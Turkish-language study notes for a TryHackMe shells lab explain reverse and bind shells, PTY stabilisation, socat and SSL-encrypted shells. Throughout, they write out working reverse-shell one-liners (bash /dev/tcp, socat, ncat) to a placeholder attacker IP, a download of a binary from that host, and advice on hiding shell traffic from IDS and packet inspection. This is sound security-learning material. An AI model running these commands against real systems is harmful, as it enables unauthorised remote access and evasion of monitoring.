# Shell Notları — What the Shell (TryHackMe)

---

## Shell Nedir?

Shell, işletim sistemiyle komut arayüzü üzerinden etkileşim kurmayı sağlayan programdır. `bash`, `zsh`, `sh` gibi araçlar birer shell'dir.

```
Sen → Shell → Kernel → Donanım
```

Siber güvenlik bağlamında **"shell almak"** = hedef sistemde komut çalıştırabilir hale gelmek demektir.

### Reverse Shell
Hedef makine saldırgana bağlanır. Saldırgan tarafında listener açılır.

```bash
# Saldırgan
nc -lvnp 4444

# Hedef
bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1
```

**Tercih sebebi:** Hedefte gelen bağlantıları engelleyen firewall olsa bile, giden bağlantılar genellikle serbesttir.

### Bind Shell
Hedef makine bekler, saldırgan bağlanır.

```bash
# Hedef
nc -lvnp 4444 -e /bin/bash

# Saldırgan
nc HEDEF_IP 4444
```

**Dezavantajı:** Hedefte açık port gerekir, firewall engelleyebilir.

### Shell Türleri (Stabilite)

| Tür | Açıklama |
|---|---|
| Dumb shell | Sadece komut çalışır, TAB yok, CTRL+C bağlantıyı keser |
| Semi-interactive | Kısmi etkileşim |
| Fully interactive (PTY) | Gerçek terminal gibi; `vim`, `su`, `ssh` çalışır |

---

## Interactive vs Non-Interactive Shell

### Interactive Shell
Kullanıcıyla gerçek zamanlı etkileşim için tasarlanmış shell.
- TAB completion, history, CTRL+C/Z çalışır
- `su`, `ssh`, `sudo`, `vim` gibi input bekleyen komutlar çalışır
- Terminalde açılan `bash` oturumu bu türdür

### Non-Interactive Shell
Otomatik çalıştırılan, kullanıcıdan input beklemeyen shell.
- Cron job'lar, bash script'leri bu türde çalışır
- `su`, `ssh` gibi komutlar input isteyemez, hata verir ya da beklenmedik davranır

### Neden Önemli?
Netcat ile alınan shell'ler varsayılan olarak **non-interactive**'tir:

```bash
$ su root     # password prompt çıkmaz
$ vim file    # ekran bozulur
```

PTY upgrade yaparak interactive hale getirilir.

---

## Shell Stabilisation

Netcat shell'i dumb/non-interactive olarak gelir. Stabilisation = bunu gerçek bir terminale dönüştürmek.

### Yöntem 1: Python PTY (En Yaygın)

```bash
# 1. PTY spawn et
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background'a at
# CTRL+Z

# 3. Raw mod + geri dön
stty raw -echo; fg

# 4. Terminal düzelt
export TERM=xterm
```

`stty raw -echo` açıklaması:
- `raw`: her karakteri direkt iletir
- `-echo`: çift görüntülemeyi engeller
- Artık CTRL+C hedef shell'e sinyal gönderir, bağlantıyı kesmez

### Yöntem 2: rlwrap

```bash
rlwrap nc -lvnp 4444
```

History ve ok tuşlarını aktif eder. Python olmayan sistemler için hızlı geçici çözüm.

### Yöntem 3: Socat

```bash
# Saldırgan
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Hedef
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:SALDIRGAN_IP:4444
```

Direkt fully interactive shell verir. Hedefte kurulu olmayabilir; bu durumda static binary transfer edilir:

```bash
# Saldırgan — binary'yi sun
python3 -m http.server 8080

# Hedef — indir
wget http://SALDIRGAN_IP:8080/socat -O /tmp/socat
chmod +x /tmp/socat
```

### Terminal Boyutu Düzeltme

Stabilisation sonrası `vim` bozuk görünüyorsa:

```bash
# Kendi terminalinde
stty size   # örn: 38 167

# Hedef shell'inde
stty rows 38 cols 167
```

### Karşılaştırma

| Yöntem | Stabilite | Gereksinim |
|---|---|---|
| Python PTY | Orta-İyi | Python 3 (hedef) |
| rlwrap | Zayıf-Orta | rlwrap (saldırgan) |
| Socat | Tam | Socat (hedef) |

---

## Socat — Tanım, Netcat Farkı ve Kullanım

Socat (SOcket CAT), iki nokta arasında bidirectional veri akışı kuran araçtır. Netcat'ten farklı olarak TCP/UDP dışında PTY, Unix socket, dosya gibi stream türlerini de destekler.

### Netcat vs Socat

| Özellik | Netcat | Socat |
|---|---|---|
| Temel işlev | TCP/UDP stream | Her türlü stream |
| PTY desteği | Yok | Var |
| SSL desteği | Yok | Var |
| Syntax | Basit | Verbose ama güçlü |
| Hedefte bulunma ihtimali | Yüksek | Düşük |
| Stabilite | Düşük | Yüksek |

### Syntax Mantığı

Socat her zaman iki adres alır:

```bash
socat [ADRES_1] [ADRES_2]
```

### Basit Listener / Connector

```bash
# Netcat
nc -lvnp 4444
nc HEDEF_IP 4444

# Socat karşılığı
socat TCP-LISTEN:4444 -
socat - TCP:HEDEF_IP:4444
```

### Reverse Shell

```bash
# Netcat
nc -lvnp 4444
bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1

# Socat karşılığı
socat TCP-LISTEN:4444 -
socat TCP:SALDIRGAN_IP:4444 EXEC:"bash -li"
```

### Fully Interactive Reverse Shell

```bash
# Saldırgan
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Hedef
socat TCP:SALDIRGAN_IP:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

| Parametre | Açıklama |
|---|---|
| `file:\`tty\`` | Saldırganın terminalini akışa bağlar |
| `raw,echo=0` | Raw mod, echo kapalı |
| `pty` | Hedefte pseudo-terminal oluşturur |
| `stderr` | Hata çıktısını dahil eder |
| `setsid` | Yeni session'da başlatır |
| `sigint` | CTRL+C sinyalini iletir |
| `sane` | Terminal ayarlarını sıfırlar |

### Bind Shell

```bash
# Netcat
nc -lvnp 4444 -e /bin/bash
nc HEDEF_IP 4444

# Socat karşılığı
socat TCP-LISTEN:4444 EXEC:"bash -li"
socat - TCP:HEDEF_IP:4444
```

---

## Encrypted Shell

Şifreli shell, iki nokta arasındaki trafiği SSL/TLS ile şifreler. Normal shell trafiği plaintext gider; IDS/IPS veya ağ monitörü kullanan sysadmin ne yapıldığını görebilir.

### Normal Shell vs Encrypted Shell

| Durum | Normal Shell | Encrypted Shell |
|---|---|---|
| IDS/IPS tespiti | Kolayca tespit edilir | Trafik şifreli, içerik görünmez |
| Wireshark izleme | Komutlar plaintext | Anlamsız şifreli veri |
| Deep Packet Inspection | Engellenir | HTTPS gibi görünür, geçer |

### Sertifika Oluşturma (Saldırgan Tarafında)

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

- `-nodes`: private key parolasız (bağlantıda prompt çıkmasın)
- `-x509`: self-signed sertifika
- `shell.pem`: key + sertifika birleşimi

### Encrypted Reverse Shell

```bash
# Saldırgan
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 file:`tty`,raw,echo=0

# Hedef
socat OPENSSL:SALDIRGAN_IP:4444,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
```

### Encrypted Bind Shell

```bash
# Hedef (sertifika listener tarafında olmalı)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane

# Saldırgan
socat OPENSSL:HEDEF_IP:4444,verify=0 file:`tty`,raw,echo=0
```

**Not:** Bind shell'de sertifika hedefte, reverse shell'de saldırganda bulunur.

### `verify=0` Ne Demek?
Sertifika doğrulamasını devre dışı bırakır. Self-signed sertifika CA tarafından imzalanmadığı için doğrulama yapılmadan bağlanılır. Pentesting ortamında yeterlidir.

### Ncat ile Alternatif

```bash
# Saldırgan
ncat -lvnp 4444 --ssl

# Hedef
ncat SALDIRGAN_IP 4444 --ssl -e /bin/bash
```

Socat kadar güçlü değil ama syntax çok daha basit.


[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
